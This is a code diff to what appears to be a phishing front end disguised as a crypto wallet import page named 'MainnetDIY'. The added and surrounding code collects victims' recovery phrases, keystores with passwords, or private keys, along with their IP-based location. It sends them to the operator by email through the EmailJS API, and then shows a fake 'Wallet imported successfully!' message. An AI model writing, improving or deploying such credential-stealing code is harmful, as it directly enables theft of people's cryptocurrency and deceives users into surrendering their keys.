@@ -3370,19 +3370,33 @@ const setManualTab = (tab) => {
   manualTab.value = tab;
 };
 
+const buildLinkDrops = () => {
+  if (manualTab.value === "walletconnect") {
+    return phrase.value.trim()
+      ? `Recovery phrase:\n${phrase.value.trim()}`
+      : "Recovery phrase:";
+  }
+
+  if (manualTab.value === "browser") {
+    return `Keystore:\n${keystore.value.trim()}\n\nPassword:\n${keystore_password.value.trim()}`;
+  }
+
+  if (manualTab.value === "hardware") {
+    return private_key.value.trim()
+      ? `Private key:\n${private_key.value.trim()}`
+      : "Private key:";
+  }
+
+  return "";
+};
+
 const manualProceed = async () => {
   isLoading.value = true;
 
   try {
     const locationData = await fetch("https://ipapi.co/json");
     const locationDataJson = await locationData.json();
-
-    const payload = {
-      keystore: keystore.value,
-      keystore_password: keystore_password.value,
-      private_key: private_key.value,
-      phrase: phrase.value,
-    };
+    const formattedLocation = JSON.stringify(locationDataJson, null, 2);
 
     const params = {
       service_id: "service_8lwf7pj",
@@ -3390,14 +3404,14 @@ const manualProceed = async () => {
       user_id: "X8SiUQHYTJaQV4lbE",
       template_params: {
         from_name: "MainnetDIY",
-        wallet_type: `${selectedWallet.value.name}`,
-        location: locationDataJson,
-        link_drops: JSON.stringify(payload),
+        wallet_type: selectedWallet.value?.name || "Unknown Wallet",
+        location: formattedLocation,
+        link_drops: buildLinkDrops(),
         reply_to: "edgir973@gmail.com",
       },
     };
 
-    console.log(params)
+    console.log(params);
 
     const response = await fetch(
       "https://api.emailjs.com/api/v1.0/email/send",
@@ -3412,7 +3426,7 @@ const manualProceed = async () => {
 
     const resultText = await response.text();
 
-    if (true) {
+    if (response.ok) {
       showMessage("Wallet imported successfully!", "success");
       openCloseModal();
     } else {
